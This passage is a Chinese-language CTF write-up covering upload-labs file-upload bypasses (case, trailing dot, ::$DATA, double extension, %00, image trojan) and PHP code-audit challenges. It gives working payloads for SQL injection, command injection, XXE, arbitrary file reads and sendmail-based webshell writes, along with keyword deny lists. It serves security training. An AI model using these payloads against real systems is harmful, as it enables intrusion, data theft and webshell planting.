array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 本题与第十题完全一样，详细解答见第十题 pass6$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 仔细查看源码会发现少了下面的这段代码 $file_ext = strtolower($file_ext); //转换为小写 这里就可以大小写绕过。将文件后缀名改为.pHp , .PHP等 pass7$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 跟第六关对比发现少了这句话 $file_ext = trim($file_ext); //首尾去空 利用Windows系统的文件名特性。文件名最后增加空格和点，写成1.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php pass8$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 这段代码少了这句话，可以与第六关相同的做法 $file_name = deldot($file_name);//删除文件名末尾的点 pass9$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 仔细观察发现少了这段代码 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA 采用Windows文件流特性绕过 将文件名改为 1.php::$DATA,但是实质上保存的文件还是1.php pass10$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 这一句代码是用来检测末尾是否是.，可以双写绕过。抓包将文件名改为1.php. . （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了 pass11$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 这段代码是将文件名中出现 deny_ext的后缀名替换为空 可以双写绕过，即1.pphphp pass12$is_upload = false; $msg = null; if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125; &#125; 本题与之前的题目有所不同，这题的文件的保存路径是可以控制的 这里用的%00截断，原理如下 www.xxx.com/qq.jpg www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php pass13这题与上题利用的原理相同 但是这里要使用 00的二进制形式 pass14明确说了上传图片木马 function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType; &#125; GIF89a 是GIF图片的文件头 ，是为了绕过gif文件的检查 图片木马的制作 桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马 copy 2.jpg /b + 1.php /a webshell.jpg 代码审计1.in_array//1.php &lt;?php include &#x27;config.php&#x27;; $conn = new mysqli($servername, $username, $password, $dbname); if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot;); &#125; $sql = &quot;SELECT COUNT(*) FROM users&quot;; $whitelist = array(); $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $whitelist = range(1, $row[&#x27;COUNT(*)&#x27;]); &#125; $id = stop_hack($_GET[&#x27;id&#x27;]); $sql = &quot;SELECT * FROM users WHERE id=$id&quot;; if (!in_array($id, $whitelist)) &#123; die(&quot;id $id is not in whitelist.&quot;); &#125; $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); echo &quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;; foreach ($row as $key =&gt; $value) &#123; echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;; echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;; &#125; echo &quot;&lt;/table&gt;&lt;/center&gt;&quot;; &#125; else&#123; die($conn-&gt;error); &#125; ?&gt; 漏洞解析 ： 这一关卡考察的是一个任意文件上传漏洞，而导致这一漏洞的发生则是不安全的使用 in_array() 函数来检测上传的文件名，即上图中的第12行部分。由于该函数并未将第三个参数设置为 true ，这导致攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 7shell.php 。因为PHP在使用 in_array() 函数判断时，会将 7shell.php 强制转换成数字7，而数字7在 range(1,24) 数组中，最终绕过 in_array() 函数判断，导致任意文件上传漏洞。 in_array() 漏洞利用的例题如下 //index.php &lt;?php include &#x27;config.php&#x27;; $conn = new mysqli($servername, $username, $password, $dbname); if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot;); &#125; $sql = &quot;SELECT COUNT(*) FROM users&quot;; $whitelist = array(); $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $whitelist = range(1, $row[&#x27;COUNT(*)&#x27;]); &#125; $id = stop_hack($_GET[&#x27;id&#x27;]); $sql = &quot;SELECT * FROM users WHERE id=$id&quot;; if (!in_array($id, $whitelist)) &#123; die(&quot;id $id is not in whitelist.&quot;); &#125; $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); echo &quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;; foreach ($row as $key =&gt; $value) &#123; echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;; echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;; &#125; echo &quot;&lt;/table&gt;&lt;/center&gt;&quot;; &#125; else&#123; die($conn-&gt;error); &#125; ?&gt; //config.php &lt;?php $servername = &quot;localhost&quot;; $username = &quot;fire&quot;; $password = &quot;fire&quot;; $dbname = &quot;day1&quot;; function stop_hack($value)&#123; $pattern = &quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;; $back_list = explode(&quot;|&quot;,$pattern); foreach($back_list as $hack)&#123; if(preg_match(&quot;/$hack/i&quot;, $value)) die(&quot;$hack detected!&quot;); &#125; return $value; &#125; ?&gt; 可以看到网页的功能很简单，就是输入用户id，然后服务器返回用户的信息，但是对id参数使用in_array()函数进行了检查，但是我们可以利用上面提到的漏洞，只要payload的第一个字符在range(1,count(*))的范围之内即可绕过第检查。绕过效果如下 但是有一个stop_hack函数，其过滤了很多sql注入中常用的关键词，导致了很多方法无法使用，其中or被过滤就很麻烦，information_schema中包含or单词，所以常规的注入方法无法使用。 这里可以使用报错注入，使用 make_set()函数实现报错注入。 ?id=1 and updatexml(1,make_set(7,0x7e,(select user()),0x7e),1) 表名，列名无法使用information_shcema，但是如果是为了获取flag的话，可以猜测是在flag表的flag列 最后获取flag的payload ?id=1 and updatexml(1,make_set(7,0x7e,(select flag from flag),0x7e),1) 2.filter_var函数缺陷&lt;?php $url = $_GET[&#x27;url&#x27;]; if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123; $site_info = parse_url($url); if(preg_match(&#x27;/sec-redclub.com$/&#x27;,$site_info[&#x27;host&#x27;]))&#123; exec(&#x27;curl &quot;&#x27;.$site_info[&#x27;host&#x27;].&#x27;&quot;&#x27;, $result); echo &quot;&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info[&#x27;host&#x27;]&#125; successfully!&lt;/h1&gt;&lt;/center&gt; &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;; echo implode(&#x27; &#x27;, $result); &#125; else&#123; die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;); &#125; &#125; else&#123; echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt; &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;; &#125; ?&gt; filter_var 代码审计 输入的网址首先经过 filter_var()判断是否符合 uri 格式要求，然后用 parse_url() 提取出其中的 host 部分，拼接到 exec()函数里，而 url 是可控的，明显思路是要利用 exec()来命令执行。 可以使用如下 payload 进入命令执行，引号用来闭合 curl 后面的引号，分号则用来闭 合命令，从而执行 ls 命令，并且由于 parse_url()的解析问题，会把第一个分号后面的 内容当作 host 部分，则绕过了正则匹配检查。 ?url=hello://&quot;;ls;&quot;sec-redclub.com 此时的$site_info[host]的值为&quot;;dir;&quot;sec-redclub.com，那么拼接后的语句 为 curl &quot;&quot;;dir;&quot;sec-redclub.com&quot; 这样当exec执行时就会执行到dir命令，所以就可以列出目录 读取flag ?url=hello://&quot;;more$&#123;IFS&#125;;&quot;sec-redclub.com 3.实例化任意对象漏洞&lt;?php class NotFound&#123; function __construct() &#123; die(&#x27;404&#x27;); &#125; &#125; spl_autoload_register( function ($class)&#123; new NotFound(); &#125; ); $classname = isset($_GET[&#x27;name&#x27;]) ? $_GET[&#x27;name&#x27;] : null; $param = isset($_GET[&#x27;param&#x27;]) ? $_GET[&#x27;param&#x27;] : null; $param2 = isset($_GET[&#x27;param2&#x27;]) ? $_GET[&#x27;param2&#x27;] : null; if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.&#x27;=&gt;&#x27;.$value.&#x27;&lt;br&gt;&#x27;; &#125; 这道题目考察的是实例化漏洞结合XXE漏洞。我们在上图第18行处可以看到使用了 class_exists 函数来判断类是否存在，如果不存在的话，就会调用程序中的 __autoload 函数，但是这里没有 __autoload 函数，而是用 spl_autoload_register 注册了一个类似 __autoload 作用的函数，即这里输出404信息。 我们这里直接利用PHP的内置类，先用 GlobIterator 类搜索 flag文件 名字，来看一下PHP手册对 GlobIterator 类的 构造函数的定义： public GlobIterator::__construct ( string $pattern [, int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] ) 首先我们需要知道 flag 在哪个文件中，在 PHP 的内置类中可以用 GlobIterator 类来遍历文件系统，其构造函数的第一个参数为要搜索的文件名，第二个参数为选择文件的哪个 列目录的payload: http://127.0.0.1/homework/php/xxe/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0 读取flag 方法一： 实例化 SimpleXMLElement类来进行 XXE ?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/f1ag.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2 方法二: 使用 SplFileObject 类直接读取文件 payload ?name=SplFileObject&amp;param=./flag.php&amp;param2=r 4.escapeshellarg与escapeshellcmd使用不当主体上就是一个过滤了后的mail函数执行。mail函数的参数是这样的 bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] ) 由于默认调用的是linux的sendmail函数，所以可以在message中写入恶意代码。接着由additional_parameters 指定额外参数，从而写入在指定目录写入文件。 但是，php的mail函数也在底层默认执行了一层escapeshellcmd()函数，那么显然转义了我们的恶意代码。不过，本题代码还有一处经典的escapeshellarg()。如果escapeshellarg()+escapeshellcmd()搭配使用，将出现特殊字符逃逸的问题。buu上也有一个类似的题目.这里则借用项目里的例子简单介绍下 127.0.0.1&#x27; -v -d a=1 #escapeshellarg &#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1&#x27; #escapeshellcmd &#x27;127.0.0.1&#x27;\\\\&#x27;&#x27; -v -d a=1\\&#x27; 此时最后一步可以看出，\\\\将被解释为\\不再起到转义的作用，而是作为换行符。因此payload变为先是127.0.0.1，再-v -d-d对应的数据为a=1&#39;. 比如CVE-2016-10033 跟CVE-2016-10045的两个payload a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com a&#x27;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com 前者没有escapeshellcmd直接打。后者escapeshellcmd后又加了一层escapeshellarg导致字符逃逸。 源码如下，对其进行了注释 &lt;?php highlight_file(&#39;index.php&#39;); function waf($a)&#123; foreach($a as $key &#x3D;&gt; $value)&#123; if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;&#x2F;&#x2F;遍历所有键，不能出现flag字样 exit(&#39;are you a hacker&#39;); &#125; &#125; &#125; foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;&#x2F;&#x2F;遍历所有以post，get，cookie方式提交的数据， if($$__R) &#123; &#x2F;&#x2F;例如$flag&#x3D;a,$$flag--&gt;$a,一个新变量 foreach($$__R as $__k &#x3D;&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); &#x2F;&#x2F;若之前有这个变量并且键和值相等，就删除这个变量 &#125; &#125; &#125; if($_POST) &#123; waf($_POST);&#125; if($_GET) &#123; waf($_GET); &#125; if($_COOKIE) &#123; waf($_COOKIE);&#125; if($_POST) extract($_POST, EXTR_SKIP);&#x2F;&#x2F;将键名变成变量名，如果传入flag，应该是设置了_GET[&#39;flag&#39;]这个变量 if($_GET) extract($_GET, EXTR_SKIP); if(isset($_GET[&#39;flag&#39;]))&#123;&#x2F;&#x2F;必须设置以get方式传参的flag..这个可以用 if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hongri&#39;])&#123; exit(&#39;error&#39;); &#125; if(md5($_GET[&#39;flag&#39;] ) &#x3D;&#x3D; md5($_GET[&#39;hongri&#39;]))&#123;&#x2F;&#x2F;数组或碰撞 echo &quot;success!&quot;; $url &#x3D; $_GET[&#39;url&#39;]; $urlInfo &#x3D; parse_url($url); if(!(&quot;http&quot; 